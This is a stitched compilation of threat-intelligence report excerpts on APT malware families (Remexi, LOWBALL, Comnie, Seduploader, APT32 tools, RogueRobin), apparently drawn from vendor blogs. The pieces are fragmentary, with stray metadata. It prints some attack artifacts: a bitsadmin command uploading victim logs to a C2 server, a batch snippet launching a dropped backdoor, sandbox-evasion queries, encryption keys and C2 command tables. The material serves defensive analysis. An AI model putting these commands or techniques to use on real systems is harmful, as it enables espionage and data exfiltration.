value\u2019s MD5 hash as an initial vector It contains the following fields:    Field  Sample value Description   diskFullityCheckRatio 1.4 Malware working directory size threshold It will be deleted if it becomes as large as the free available space multiplied by this ratio   captureScreenTimeOut 72 Probability of full and active window screenshots being taken after mouse click   captureActiveWindowTimeOut 313   captureScreenQC 40 Not really used However, captureScreenTimeOut and captureActiveWindowTimeOut are worth describing in more detail as their programming logic is not so intuitive One of the malware threads checks in an infinite loop if the mouse button was pressed and then also increments the integer iterator infinitely If the mouse hooking function registers a button hit, it lets the screenshotting thread know about it through a global variable After that, it checks if the iterator divided by (captureScreenTimeOut/captureActiveWindowTimeOut) has a remainder of 0 In that case, it takes a screenshot Main module (events.exe)    SHA256  b1fa803c19aa9f193b67232c9893ea57574a2055791b3de9f836411ce000ce31   MD5 c981273c32b581de824e1fd66a19a281   Compiled GCC compiler in MinGW environment version 2.24, timestamp set to 1970 by compiler   Type I386 Windows GUI EXE   Size 68 608    After checking that the malware is not already installed, it unpacks HCK.cab using the Microsoft standard utility expand.exe with the following arguments:       expand.exe -r \\\"<full path to HCK.cab>\\\" -f:* \\\"<event_cache_dir_path>\\\\\\\"     Then it decrypts config.ini file with a hardcoded 25-byte XOR key that differs for every sample The following is the command used to exfiltrate data from the victim to the C2:       bitsadmin.exe /TRANSFER HelpCenterUpload /UPLOAD /PRIORITY normal \"<control_server>/YP01_<victim_fingerprint>_<log_file_name>\" \"<log_file_name>\"     Victims The vast majority of the users targeted by this new variant of Remexi appear to have Iranian IP addresses Some of these appear to be foreign diplomatic entities based in the country Attribution The Remexi malware has been associated with an APT actor called Chafer by Symantec One of the human-readable encryption keys used is \u201csalamati\u201d This is probably the Latin spelling for the word \u201chealth\u201d in Farsi Among the artifacts related to malware authors, we found in the binaries a .pdb path containing the Windows user name \u201cMohamadreza New\u201d Interestingly, the FBI website for wanted cybercriminals includes two Iranians called Mohammad Reza, although this could be a common name or even a false flag Conclusions Activity of the Chafer APT group has been observed since at least 2015, but based on things like compilation timestamps and C&C registration, it\u2019s possible they have been active for even longer Traditionally, Chafer has been focusing on targets inside Iran, although their interests clearly include other countries in the Middle East We will continue to monitor how this set of activity develops in the future Indicators of compromise File hashes  events.exe 028515d12e9d59d272a2538045d1f636 03055149340b7a1fd218006c98b30482

threat group, which FireEye tracks as an uncategorized advanced persistent threat (APT) group and other researchers refer to as \u201cadmin@338,\u201d may have conducted the activity.[1] The email messages contained malicious documents with a malware payload called LOWBALL We collaborated with Dropbox to investigate the threat, and our cooperation revealed what may be a second, similar operation The threat group\u2019s latest activity coincided with the announcement of criminal charges against democracy activists.[6] During the past 12 months, Chinese authorities have faced several challenges, including large-scale protests in Hong Kong in late 2014, the precipitous decline in the stock market in mid-2015, and the massive industrial explosion in Tianjin in August 2015 In Hong Kong, the pro-democracy movement persists, and the government recently denied a professor a post because of his links to a pro-democracy leader.[7] Multiple China-based cyber threat groups have targeted international media organizations in the past The targeting has often focused on Hong Kong-based media, particularly those that publish pro-democracy material The media organizations targeted with the threat group\u2019s well-crafted Chinese language lure documents are precisely those whose networks Beijing would seek to monitor The first email references the creation of a Christian civil society organization to coincide with the anniversary of the 2014 protests in Hong Kong known as the Umbrella Movement This campaign, however, is clearly designed for those who read the traditional Chinese script commonly used in Hong Kong The communication occurs via HTTPS over port 443 However, this is most likely meant to be a mechanism to update the compromised host with a new version of the LOWBALL malware The threat group monitors its Dropbox account for responses from compromised computers Once the LOWBALL malware calls back to the Dropbox account, the attackers will create a file called \u201c[COMPUTER_NAME]_upload.bat\u201d which contains commands to be executed on the compromised computer This batch file is then executed on the target computer, with the results uploaded to the attackers\u2019 Dropbox account in a file named \u201c[COMPUTER_NAME]_download\u201d We observed the threat group upload a second stage malware, known as BUBBLEWRAP (also known as Backdoor.APT.FakeWinHTTPHelper) to their Dropbox account along with the following command:  @echo off\u00a0  \u00a0ren \"%temp%\\upload\" audiodg.exe\u00a0  \u00a0start %temp%\\audiodg.exe\u00a0

FireEye works closely with security researchers and industry partners to mitigate cyber threats, and we collaborated with Dropbox to respond to this activity The Dropbox security team was able to identify this abuse and put countermeasures in place Our cooperation uncovered what appears to be a second, ongoing operation, though we lack sufficient evidence to verify if admin@338 is behind it The attack lifecycle followed the same pattern, though some of the filenames were different, which indicates that there may be multiple versions of the malware In addition, while the operation targeting Hong Kong-based media involved a smaller number of targets and a limited duration, we suspect this second operation involves up to 50 targets At this time, we are unable to identify the victims LOWBALL is an example of malware that abuses cloud storage services to mask its activity from network defenders The LOWBALL first stage malware allows the group to collect information from victims and then deliver the BUBBLEWRAP second stage malware to their victims after verifying that they are indeed interesting targets A version of this article appeared first on the FireEye

series of attacks using a remote backdoor malware family named Comnie, which have been observed targeting organizations in the East Asia region The Comnie malware family is notable in that it leverages online blogs and third-party services to obtain command and control (C2) information Recent instances of the malware have been observed leveraging github.com, tumbler.com, and blogspot.com These decoys documents pertain to various subject matters that the targets would be likely to be interested in The contents of these documents suggest that the main interests of threat actor likely included the organizations in the following industries, located in Taiwan:  Telecommunication Defense Government High Tech  The most recent attacks, in November 2017, likely targeted organizations in the following industries, located in South Korea:  Aerospace Defense  Additionally, while researching this campaign, we identified historical attacks that appear to target the Taiwan government, an IT service vendor based in Asia, and a journalist of a Tibetan radio station Activities Involving Comnie Beginning in mid of 2015, we observed the Comnie malware family delivered via malicious macros with various file names and decoy subject matters Original file names, as well as information revealed within the decoy documents used by these samples provide clues as to who the targets may be In the most recent attacks in November 2017, the information suggests that these attacks have most likely taken place against Aerospace and Defense industry targets in South Korea Original File Name

Taiwan as early as 2015 Again, based on the original file names and the decoy contents, the most commonly witnessed targets in attacks that occurred in 2017 included those involving the Telecommunication, Defense, and High-Tech industries in Taiwan Executes the newly created wscript.exe payload   Figure 7 Example macro used to delivery Comnie An interesting discovery was made when examining the macros used to deliver Comnie Based on evidence gleaned from both the macro and other data collected from the samples, it appears that the threat actor did not generate these documents from scratch Instead, they appear to have been created based on an existing sample available via public sample repositories The existing sample in question was created by a red team penetration tester at a financial institution for internal testing The following image shows a comparison of macro code extracted from Comnie dropper and financial institution\u2019s penetration test sample Figure 8 Comparison of macros extracted from Comnie dropper versus a pentest sample used by a financial organization  Comnie Malware Family Comnie uses the RC4 algorithm in multiple locations both to obfuscate strings used by the malware, as well as for network communication Additionally, the malware looks for multiple security products on victim machines and sometimes alters its behavior depending on the products present More information about how Comnie handles identified security products may be found in the technical analysis in the Appendix These security products included those that are known to be most widely used within South Korea and Taiwan When originally run, Comnie will convert itself from an executable file to a DLL and will write this newly created DLL to the host machine\u2019s %APPDATA% directory Unit 42 has observed a total of two variants of Comnie One of the ways the variants differ is in how they obtain their command and control (C2) information Both variants make use of third-party online services in an attempt to prevent DNS based blocking of their first stage communications However, the obfuscation mechanism varies slightly In older variants, Comnie was found to look for the \u2018++a++\u2019 markers Newer Comnie variants, such as the ones witnessed in the most recent attacks, instead look for the \u2018magnet:/\u2019 and \u2018?\u2019 markers, such as in the following recent example:  Figure 10 New Comnie variants determining their C2 information via a GitHub profile Comnie will upload information about the victim It also allows the attacker to provide and subsequently execute a batch script (BAT), executable file (EXE), or dynamic-link library (DLL) More detailed information about how C2 information is decoded and additional technical analysis of Comnie may be found in the Appendix Conclusion Comnie is far from a new threat, however, it continues to remain active In the past year, we have observed multiple low volume attacks in various regions of East Asia Based on clues provided by the malware\u2019s original file names, as well as the decoy content embedded within these samples, we can make a reasonable estimation that these attacks targeted organizations in Taiwan in the Telecommunication, Defense, Government, and High-Tech industries Additionally, those same estimations may be made for attacks in South Korea targeting the Aerospace and Defense industries While we have witnessed modifications to the attacker\u2019s toolsets, the overall architecture and operations of the Comnie malware family have remained consistent, suggesting that the attackers have been able to stay below the radar of the security community The Comnie malware family is notable in that it leverages third-party online services to download and parse C2 information Because these third-party online services are legitimate, it allows Comnie to circumvent a number of security preventions that may be present in the environment This overall technique has previously been referred to as using a \u201cDead Drop Resolver\u201d or DDR Palo Alto Networks customers are protected from this threat in the following ways:  All identified samples have been flagged as malicious by WildFire and Traps Customers may track this threat using the \u2018Comnie\u2019 AutoFocus tag Traps appropriately catches the macro execution from the malware and prevents it  Additionally, blogspot, tumblr, and github have been alerted to the malicious activity discovered Appendix  Comnie Technical Analysis For the analysis of the Comnie malware family, we investigated the following sample:    SHA256 18ec68e1bd9b11f22e481d48c415f8d80edb76e9032ba4e1d31d87e16eed9959    When the sample is initially executed, it will attempt to create a mutex with a name of \u2018tmutexabc\u2019 to ensure only a single instance of Comnie is running at a given time Should this mutex already be found to exist, the malware will immediately exit After these functions are loaded, Comnie determines if it is running within the %TEMP% directory of the victim machine In the event it is not running within this directory, it will copy itself to %TEMP% and execute this newly created file with an argument of the original file\u2019s path It is unclear how this file is used exactly, as it does not appear to ever be written during runtime by Comnie Comnie continue to enter its installation routine With a few exceptions, Comnie will perform the following actions regardless of what security product, if any, is discovered:  Convert itself to a temporary DLL with a default export of \u2018Dm\u2019 in the %TEMP% directory In such a scenario, Comnie will drop a temporary VBS script to write the \u2018Conime.lnk\u2019 file After the installation routine, the malware will decrypt an embedded blob of data using RC4 with an embedded 8-byte static key of \u2018\\x11\\xcc\\xd1\\x32\\x61\\x21\\xd1\\xe2\u2019 The first 64 bytes are used as the key The next 4 bytes represent the underlying data\u2019s length, and the remaining data is the C2 data Data is sent via HTTP, and is encrypted against using the RC4 algorithm Data is provided first via the \u2018pid\u2019 GET parameter initially, and via the \u2018iid\u2019 GET parameter when POST requests are made by Comnie Initially, Comnie will send the following request:  Figure 15 Comnie initial beacon In order to decrypt the data provided within the \u2018pid\u2019 parameter, a key is generated using the SessionID information, which is randomly generated This particular data is decoded from hex and bytes at offsets 0, 2, 4, 6, 8, 10, 12, and 14 are used to form an 8-byte RC4 key In this case, the instruction is asking for information that is to be written to a temporary BAT file within the %TEMP% directory The following example information is provided by the remote C2 server:       [MISSION]Id=2017Crc=201701[BAT]Num=1FileName1=gethostinfo.batCrc1=2017011ResultFile1=info.dat     \u00a0 This INI file is parsed to determine what Comnie should do The results of this BAT script are uploaded to the remote C2 server", "noreply@blogger.com (Paul Rascagneres)", "October 22, 2017", "\u201cCyber

deceptive flyer relating to the Cyber Conflict U.S conference CyCon US is a collaborative effort between the Army Cyber Institute at the United States Military Academy and the NATO Cooperative Cyber Military Academy and the NATO Cooperative Cyber Defence Centre of Excellence Due to the nature of this document, we assume that this campaign targets people with an interest in cyber security Unlike previous campaigns from this actor, the flyer does not contain an Office exploit or a 0-day, it simply contains a malicious Visual Basic for Applications (VBA) macro.The VBA drops and executes a new variant of Seduploader This reconnaissance malware has been used by Group 74 for years and it is composed of 2 files: a dropper and a payload The dropper and the payload are quite similar to the previous versions but the author modified some public information such as MUTEX name, obfuscation keys.", "We assume that these modifications were performed to avoid detection based on public IOCs.The article describes the malicious document and the Seduploader reconnaissance malware, especially the difference with the previous versions.Malicious Office DocumentDecoy DocumentThe decoy document is a flyer concerning the Cyber Conflict U.S conference with the following filename Conference_on_Cyber_Conflict.doc It contains 2 pages with the logo of the organizer and the sponsors:Due to the nature of the document, we assume that the targeted people are linked or interested by the cybersecurity landscape The exact content of the document can be found online on the conference website The attackers probably copy/pasted it into Word to create the malicious document.VBAThe Office document contains a VBA script Some of this information can be directly extracted from the Windows explorer by looking at the properties of the file The \"Hyperlink Base\" must be extracted using another tool, strings is capable of obtaining this by looking for long strings Pay close attention to the contents of these fields as they appear base64 encoded.This extracted information is concatenated together to make a single variable This variable is decoded with the base64 algorithm in order to get a Windows library (PE file) which is written to disk We see that this file drops 2 additional files: netwf.bat and netwf.dll We can also see 2 VBA variable names: PathPld, probably for Path Payload, and PathPldBt, for Path Payload Batch.Seduploader VariantDropper AnalysisAs opposed to previous campaigns performed by this actor, this latest version does not contain privilege escalation and it simply executes the payload and configures persistence mechanisms In this case, explorer.exe will instance the MMDeviceEnumerator class and will execute the payload.Payload AnalysisThe payload features are similar to the previous versions of Seduploader We can compare it to the sample e338d49c270baf64363879e5eecb8fa6bdde8ad9 used in May 2017 by Group 74 Of the 195 functions of the new sample, 149 are strictly identical, 16 match at 90% and 2 match at 80%:In the previous campaign where adversaries used Office document exploits as an infection vector, the payload was executed in the Office word process In this campaign, adversaries did not use any exploit Instead,the payload is executed in standalone mode by rundll32.exe.Adversaries also changed some constants, such as the XOR key used in the previous version The key in our version is:key=b\"\\x08\\x7A\\x05\\x04\\x60\\x7c\\x3e\\x3c\\x5d\\x0b\\x18\\x3c\\x55\\x64\"The MUTEX name is different too: FG00nxojVs4gLBnwKc7HhmdK0hHere are some of the Seduploader features:Screenshot capture (with the GDI API);data/configuration exfiltration;Execution of code;File downloading;The Command & Control (CC) of the analysed sample is myinvestgroup[.]com During the investigation, the server did not provide any configuration to the infected machines Based on the metadata of the Office documents and the PE files, the attackers had created the file on Wednesday, the 4th of October We can see, in Cisco Umbrella, a peak in activities 3 days later, Saturday the 7th of October:ConclusionAnalysis of this campaign shows us once more that attackers are creative and use the news to compromise the targets This campaign has most likely been created to allow the targeting of people linked to or interested by cybersecurity, so probably the people who are more sensitive to cybersecurity threats In this case, Group 74 did not use an exploit or any 0-day but simply used scripting language embedded within the Microsoft Office document Due to this change, the fundamental compromise mechanism is different as the payload is executed in a standalone mode The reasons for this are unknown, but, we could suggest that they did not want to utilize any exploits to ensure they remained viable for any other operations Actors will often not use exploits due to the fact that researchers can find and eventually patch these which renders the actors weaponized platforms defunct Additionally the author did some small updates after publications from the security community, again this is common for actors of this sophisticated nature, once their campaigns have been exposed they will often try to change tooling to ensure better avoidance For example the actor changed the XOR key and the MUTEX name We assume that these modifications were performed in order to avoid detection based on public IOCs", "by Nick Carr", "April 03, 2019", "Cyber Espionage is Alive and Well: APT32 and the Threat to Global Corporations \u00ab Cyber Espionage is Alive and Well: APT32

carrying out intrusions into private sector companies across multiple industries and have also targeted foreign governments, dissidents, and journalists FireEye assesses that APT32 leverages a unique suite of fully-featured malware, in conjunction with commercially-available tools, to conduct targeted operations that are aligned with Vietnamese state interests APT32 and FireEye\u2019s Community Response In the course of investigations into intrusions at several corporations with business interests in Vietnam, FireEye\u2019s Mandiant incident response consultants uncovered activity and attacker-controlled infrastructure indicative of a significant intrusion campaign In March 2017, in response to active targeting of FireEye clients, the team launched a Community Protection Event (CPE) \u2013 a coordinated effort between Mandiant incident responders, FireEye as a Service (FaaS), FireEye iSight Intelligence, and FireEye product engineering \u2013 to protect all clients from APT32 activity In the following weeks, FireEye released threat intelligence products and updated malware profiles to customers while developing new detection techniques for APT32\u2019s tools and phishing lures This focused intelligence and detection effort led to new external victim identifications as well as providing sufficient technical evidence to link twelve prior intrusions, consolidating four previously unrelated clusters of threat actor activity into FireEye\u2019s newest named advanced persistent threat group: APT32 APT32 Targeting of Private Sector Company Operations in Southeast Asia Since at least 2014, FireEye has observed APT32 targeting foreign corporations with a vested interest in Vietnam\u2019s manufacturing, consumer products, and hospitality sectors Furthermore, there are indications that APT32 actors are targeting peripheral network security and technology infrastructure corporations Here is an overview of intrusions investigated by FireEye that are attributed to APT32:  In 2014, a European corporation was compromised prior to constructing a manufacturing facility in Vietnam In 2016, Vietnamese and foreign-owned corporations working in network security, technology infrastructure, banking, and media industries were targeted.\u00a0 In mid-2016, malware that FireEye believes to be unique to APT32 was detected on the networks of a global hospitality industry developer with plans to expand operations into Vietnam From 2016 through 2017, two subsidiaries of U.S and Philippine consumer products corporations, located inside Vietnam, were the target of APT32 intrusion operations Table 1 shows a breakdown of APT32 activity, including the malware families used in each Here is an overview of this activity:  A public blog published by the Electronic Frontier Foundation indicated that journalists, activists, dissidents, and bloggers were targeted in 2013 by malware and tactics consistent with APT32 operations In 2014, APT32 leveraged a spear-phishing attachment titled \u201cPlans to crackdown on protesters at the Embassy of Vietnam.exe,\" which targeted dissident activity among the Vietnamese diaspora in Southeast Asia Also in 2014, APT32 carried out an intrusion against a Western country\u2019s national legislature In 2015, SkyEye Labs, the security research division of the Chinese firm Qihoo 360, released a report detailing threat actors that were targeting Chinese public and private entities including government agencies, research institutes, maritime agencies, sea construction, and shipping enterprises The information included in the report indicated that the perpetrators used the same malware, overlapping infrastructure, and similar targets as APT32 In 2015 and 2016, two Vietnamese media outlets were targeted with malware that FireEye assesses to be unique to APT32 In 2017, social engineering content in lures used by the actor provided evidence that they were likely used to target members of the Vietnam diaspora in Australia as well as government employees in the Philippines APT32 Tactics In their current campaign, APT32 has leveraged ActiveMime files that employ social engineering methods to entice the victim into enabling macros APT32 actors designed multilingual lure documents which were tailored to specific victims Although the files had \u201c.doc\u201d file extensions, the recovered phishing lures were ActiveMime \u201c.mht\u201d web page archives that contained text and images These files were likely created by exporting Word documents into single file web pages Table 2 contains a sample of recovered APT32 multilingual lure files When opened, many lure files displayed fake error messages in an attempt to trick users into launching the malicious macros Figure 1 shows a fake Gmail-theme paired with a hexadecimal error code that encourages the recipient to enable content to resolve the error Figure 2 displays another APT32 lure that used a convincing image of a fake Windows error message instructing the recipient to enable content to properly display document font characters Figure 1: Example APT32 Phishing Lure \u2013 Fake Gmail Error Message Figure 2: Example APT32 Phishing Lure \u2013 Fake Text Encoding Error Message APT32 operators implemented several novel techniques to track the efficacy of their phishing, monitor the distribution of their malicious documents, and establish persistence mechanisms to dynamically update backdoors injected into memory In order to track who opened the phishing emails, viewed the links, and downloaded the attachments in real-time, APT32 used cloud-based email analytics software designed for sales organizations In some instances, APT32 abandoned direct email attachments altogether and relied exclusively on this tracking technique with links to their ActiveMime lures hosted externally on legitimate cloud storage services To enhance visibility into the further distribution of their phishing lures, APT32 utilized the native web page functionality of their ActiveMime documents to link to external images hosted on APT32 monitored infrastructure Figure 3 contains an example phishing lure with HTML image tags used for additional tracking by APT32 Figure 3: Phishing Lure Containing HTML Image Tags for Additional Tracking When a document with this feature is opened, Microsoft Word will attempt to download the external image, even if macros were disabled In all phishing lures analyzed, the external images did not exist Mandiant consultants suspect that APT32 was monitoring web logs to track the public IP address used to request remote images The first named scheduled task launched an application whitelisting script protection bypass to execute a COM scriptlet that dynamically downloaded the first backdoor from APT32\u2019s infrastructure and injected it into memory To illustrate the complexity of these lures, Figure 4 shows the creation of persistence mechanisms for recovered APT32 lure

APT32 phishing lure that dynamically injects two multi-stage malware frameworks into memory Figure 5: APT32 Phishing Chain of Events The impressive APT32 operations did not stop after they established a foothold in victim environments In another investigation, APT32 compromised the McAfee ePO infrastructure to distribute their malware as a software deployment task in which all systems pulled the payload from the ePO server using the proprietary SPIPE protocol APT32 also used hidden or non-printing characters to help visually camouflage their malware on a system Another backdoor used an otherwise legitimate DLL filename padded with a non-printing OS command control code APT32 Malware and Infrastructure APT32 appears to have a well-resourced development capability and uses a custom suite of backdoors spanning multiple protocols APT32 operations are characterized through deployment of signature malware payloads including WINDSHIELD, KOMPROGO, SOUNDBITE, and PHOREAL APT32 often deploys these backdoors along with the commercially-available Cobalt Strike BEACON backdoor APT32 may also possess backdoor development capabilities for macOS The capabilities for this unique suite of malware is shown in Table 3 The FireEye iSIGHT Intelligence MySIGHT Portal contains additional information on these backdoor families based on Mandiant investigations of APT32 intrusions Figure 6 provides a summary of APT32 tools and techniques mapped to each stage of the attack lifecycle Figure 6: APT32 Attack Lifecycle Outlook and Implications Based on incident response investigations, product detections, and intelligence observations along with additional publications on the same operators, FireEye assesses that APT32 is a cyber espionage group aligned with Vietnamese government interests The targeting of private sector interests by APT32 is notable and FireEye believes the actor poses significant risk to companies doing business in, or preparing to invest in, the country While the motivation for each APT32 private sector compromise varied \u2013 and in some cases was unknown \u2013 the unauthorized access could serve as a platform for law enforcement, intellectual property theft, or anticorruption measures that could ultimately erode the competitive advantage of targeted organizations Furthermore, APT32 continues to threaten political activism and free speech in Southeast Asia and the public sector worldwide Governments, journalists, and members of the Vietnam diaspora may continue to be targeted While actors from China, Iran, Russia, and North Korea remain the most active cyber espionage threats tracked and responded to by FireEye, APT32 reflects a growing host of new countries that have adopted this dynamic capability APT32 demonstrates how accessible and impactful offensive capabilities can be with the proper investment and the flexibility to embrace newly-available tools and techniques As more countries utilize inexpensive and efficient cyber operations, there is a need for public awareness of these threats and renewed dialogue around emerging nation-state intrusions that go beyond public sector and intelligence targets

of 2018, Unit 42 released reporting regarding activity in the Middle East surrounding a cluster of activity using similar tactics, tools, and procedures (TTPs) in which we named the adversary group DarkHydrus Since that initial reporting, we had not observed new activity from DarkHydrus until recently, when 360TIC published a tweet and subsequent research discussing delivery documents that appeared to be attributed to DarkHydrus In the process of analyzing the delivery documents, we were able to collect additional associated samples, uncover additional functionality of the payloads including the use of Google Drive API, and confirm the strong likelihood of attribution to DarkHydrus We have notified Google of our findings Delivery Document We collected a total of three DarkHydrus delivery documents installing a new variant of the RogueRobin trojan These three documents were extremely similar to each other and are all macro enabled Excel documents with .xlsm file extensions While we cannot confirm the delivery mechanism, it is likely that the instructions to click the Enable Content button were provided during delivery, such as in the body of a spear-phishing email Figure 1 DarkHydrus\u2019 delivery document does not have a lure image or message Without the delivery mechanism we cannot confirm the exact time these delivery documents were used in an attack; however, the observed timestamps within these three delivery documents gives us an idea when the DarkHydrus actors created them While the creation times were timestomped to a default time of 2006-09-16 00:00:00Z commonly observed in malicious documents, the Last Modified times were still available and suggest that DarkHydrus created these documents in December 2018 and January 2019 Table

  Table 1 Timestamps of delivery documents The macro executes immediately after pressing the Enable Content button thanks to the\u00a0 Workbook_Open sub-function, which will call the actor created New_Macro function The New_Macro function starts by concatenating several strings to create a PowerShell script that it will write to the file %TEMP%\\WINDOWSTEMP.ps1 While .sct files are used by a multitude of applications, in this instance it is being used as a Windows Script Component file The WINDOWSTEMP.ps1 script is a dropper that decodes an embedded executable using base64 and decompresses it with the System.IO.Compression.GzipStream object The WindowsTemplate.exe executable is a new variant of RogueRobin written in C# RogueRobin .NET Payload In our original blog on DarkHydrus, we analyzed a PowerShell-based payload we named RogueRobin The similarities between the PowerShell and C# variants of RogueRobin suggests that the DarkHydrus group ported their code to a compiled variant The C# variant of RogueRobin attempts to detect if it is executing in a sandbox environment using the same commands as in the PowerShell variant of RogueRobin The Trojan also checks to see if a debugger is attached to its processes and will exit if it detects the presence of a debugger gwmi -query \u201cSelect TotalPhysicalMemory from Win32_ComputerSystem\u201d Uses this query to check to see if the total physical memory is less than 2,900,000,000 bytes gwmi -Class win32_Processor | select NumberOfCores Uses this query to check to see if the total number of CPU cores is less than 1 The domain is legitimate and owned by Google This DNS query likely exists as a note to researchers or possibly as an anti-analysis measure, as it will only trigger if the researcher has already patched the initial debugger check to move onto the C2 function Figure 2 shows the code responsible for detecting the attached debugger and issuing the corresponding DNS request Figure 3 shows the RogueRobin payload issuing DNS requests to resolve custom crafted subdomains of its C2 domains using TXT, SOA, MX, CNAME, SRV, A and AAAA query types Figure 3 RogueRobin testing various DNS query types The domains in the test queries, such as aqhpc.akdns[.]live have subdomains that are generated by substituting the digits in the Trojan\u2019s process ID with characters seen in Table 4 (for example qhp for the PID 908) and surrounding these characters with the static characters a and c The C2 server can respond to any of the query types to provide a unique identifier value that the Trojan will store in a variable and use in future DNS requests The Trojan checks the response to this query using the regular expressions in Table 3 If it received a non-cancelling response, the Trojan will extract data from the DNS responses and treat it as commands Table 5 shows the commands that the C# variant of RogueRobin can handle, which is extremely similar to the previously analyzed PowerShell variant Regex  \u00a0Description   ^kill Kills a thread running in Trojan based on a provided thread name   ^\\$fileDownload Uploads a file to the C2 server via the DNS tunnel   ^\\$importModule Runs a provided PowerShell command and adds it to a list called \u2018modules\u2019   ^\\$x_mode Turns on the alternative mode of \u2018x_mode\u2019 on to use the alternative C2 channel If preceded by \u201cOFF\u201d, it turns \u2018x_mode\u2019 off, otherwise the command is newline delimited with settings to use this alternative C2 functionality ^\\$ClearModules Clears the previously run \u2018modules\u2019 list   ^\\$fileUpload This command should be followed by a string that will be used as a path to save a new file to the system This command will then reach out to the C2 server to obtain the data to save to this file path ^changeConfig Allows the C2 to set values within the Trojan\u2019s configuration via pipe delimited (\u201c|\u201d) string In x_mode, RogueRobin uploads a file to the Google Drive account and continually checks the file\u2019s modification time to see if the actor has made any changes to it The actor will first modify the file to include a unique identifier that the Trojan will use for future communications The Trojan will treat all subsequent changes to the file made by the actor as jobs and will treat them as commands, which it will handle with the same command handler seen in Table 5 Figure 4 shows the code in RogueRobin that handles the x_mode command, specifically splitting the command data on newlines and using the resulting array to set variables used as x_mode settings As seen in Figure 5, the values for these fields are set to variables initially set upon issuing of the x_mode command To upload a file, the Trojan first creates an HTTP POST request to the URL stored in gduu to send the following JSON data to the Google Drive account: { \u201cname\u201d : \u201c<process ID of Trojan>.txt\u201d } Google Drive will respond to this request with an HTTP response whose header contains a Location field The Trojan will write <process ID of Trojan> to a second file stored on the Google Drive instance named <process ID of Trojan>-U.txt The Trojan processes the downloaded data the same way it would for a unique identifier as if the data was obtained via the DNS tunneling protocol using the TXT query mode, specifically by searching the data using the following regular expression: \\\u201d(\\\\w+).(<domainList[0]>|<domainList[1]>|<domainList[n]>).\\\u201d With the unique identifier value obtained from the file on Google Drive, the Trojan will attempt to obtain jobs using the Google Drive communications channel It will use the data after the separator as the string that it will subject to the command handler seen in Table 5 Infrastructure The initial list of C2 domains released by 360TIC associated with 513813af15\u2026 appeared thematically very similar to previous DarkHydrus activity, using domain names visually similar to well-known technology vendors or service providers This list was further expanded upon by ClearSky Security (here, here and here) in a series of tweets that provided additional similar domain names also likely linked to DarkHydrus To better understand how these domains are related to DarkHydrus, we began visually mapping the relationships between the list of domains, which can be seen in Figure 7 The diagram shows the DarkHydrus group using a consistent naming schema and structure in their infrastructure They register a multitude of domains and set up nameservers to use as their primary DNS for their C2 domains Figure 7 Relational diagram of DarkHydrus infrastructure For this campaign, we are able to cluster the adversary infrastructure via the specific nameservers that were deployed for C2s The brackets in Figure 7 shows the distinct clustering of infrastructure into three groups We were able to retrieve live payloads associated with two of the clusters A third cluster was also shared by ClearSky Security, but we were unable to associate a live payload to them Although the third cluster does not appear to have any direct relationships to the other two clusters, it is still highly probable that this cluster is related to the two other clusters via the structuring of domains with custom nameservers In addition, the domain names themselves were extremely similar, with some examples being exactly the same but on a different top level domain The two sets of nameservers we were able to associate with the retrieved payloads were tbs1/tbs2.microsoftonline.services and tvs1/tvs2.trafficmanager.live The distribution of C2 domains and their nameservers can be seen in Table 7 Each of the domains appeared to have rotated through the six nameservers but oddly, one of the nameservers that several of the domains had rotated through did not appear to be currently registered Conclusion The DarkHydrus group continues their operations and adds new techniques to their playbook Recent DarkHydrus delivery documents revealed the group abusing open-source penetration testing techniques such as the AppLocker bypass The payloads installed by these delivery documents show that the DarkHydrus actors ported their previous PowerShell-based RogueRobin code to an executable variant, which is behavior that has been commonly observed with other adversary groups operating in the Middle East, such as OilRig", "Robert Falcone", "August 07, 2018", "DarkHydrus Uses Phishery to Harvest Credentials in the Middle East",

released a blog on a newly named threat group called DarkHydrus that we observed targeting government entities in the Middle East The attack that we discussed in our previous publication involved spear-phishing to deliver a PowerShell payload we call RogueRobin; however, we are aware of DarkHydrus carrying out a credential harvesting attack in June 2018 It also appears that this an ongoing campaign, as we have evidence of previous credential harvesting attempts using the same infrastructure dating back to the Fall of 2017 These attacks were targeting government entities and educational institutions in the Middle East When attempting to load this remote template, Microsoft Office will display an authentication dialog box to ask the user to provide login credentials Based on Unit 42\u2019s analysis, DarkHydrus used the open-source Phishery tool to create two of the known Word documents used in these credential harvesting attacks As discussed in our previous blog, this further strengthens DarkHydrus\u2019 use of the open source for their attack tools A phishing attack to steal credentials like this is not new: US-CERT warned of the same technique by a different threat group in 2017 What is noteworthy is DarkHydrus\u2019 use of an open-source tool to carry out targeted attacks against these entities in the Middle East, which is fitting of their reliance of open source tools and these attacks are consistent in terms of targeting with what we reported last week Based on this, we can reasonably presume this group will continue to carry out attacks against these kinds of targets in the Middle East in the near-future When opened, the malicious Word document displays a dialog box that asks the user for their credentials, as seen in Figure 1 Figure 1 Authentication dialog box presented to the user when opening document As you can see in Figure 1, the authentication prompt says \u201cConnecting to <redacted> 0utl00k[.]net\u201d, which is a DarkHydrus C2 server If the user enters their credentials in this dialog box and presses \u2018Ok\u2019, the credentials are sent to the C2 server via the URL https://<redacted>.0utl00k[.]net/download/template.docx With the authentication dialog box gone, Word displays the contents of the document, which in this specific case was an empty document While this document was empty, the authentication prompt\u00a0may have made the targeted user more likely\u00a0to enter their credentials, thinking it\u2019s necessary to view the contents of the document DarkHydrus also created their C2 domain carefully in an attempt to further trick the targeted user to enter their credentials Firstly, the redacted subdomain was the domain of the targeted educational institution Also, the 0utl00k[.]net domain resembles Microsoft\u2019s legitimate \u201coutlook.com\u201d domain that provides free email services, which also make the user less suspicious and more likely to enter their credentials Some users may not even notice what domain the dialog states they are connecting to and habitually type their Windows credentials We found two additional Word documents using the 0utl00k[.]net domain to harvest credentials, seen in Table 1 We first saw these related Word documents in September and November 2017, which suggests that DarkHydrus has been carrying out this credential harvesting campaign for almost a year First Seen SHA256 Filename Remote Template   11/12/2017 9eac37a5c6", "PasswordHandoverForm.docx https://0utl00k[.]net/docs   09/18/2017 0b1d5e1744", "Unlike the June 2018 document that displayed no content after credential theft, both of these documents displayed content that appears pertinent to the targeted organization The September 2017 document displays an employee survey, which can be seen in Figure 2 We were unable to find the displayed document via open source research, which may suggest that the actor gathered this password handover form from a prior operation This same infrastructure was discussed in the Campaign Analysis of our previous blog Phishery Tool While analyzing the three malicious Word documents, we determined that two of the documents were created using an open source tool called Phishery The Phishery tool is capable of the following:  Creating malicious Word documents by injecting a remote template URL Hosting a C2 server to gather credentials entered into authentication dialog boxes displayed when attempting to obtain the remote template  We were able to confirm that DarkHydrus used Phishery to create these Word documents by using the open source tool to create a document and host a C2 ourselves The DarkHydrus document used in the June 2018 attacks had a remote template URL added, as seen in Figure 4 Figure 4 Remote template URL seen in the 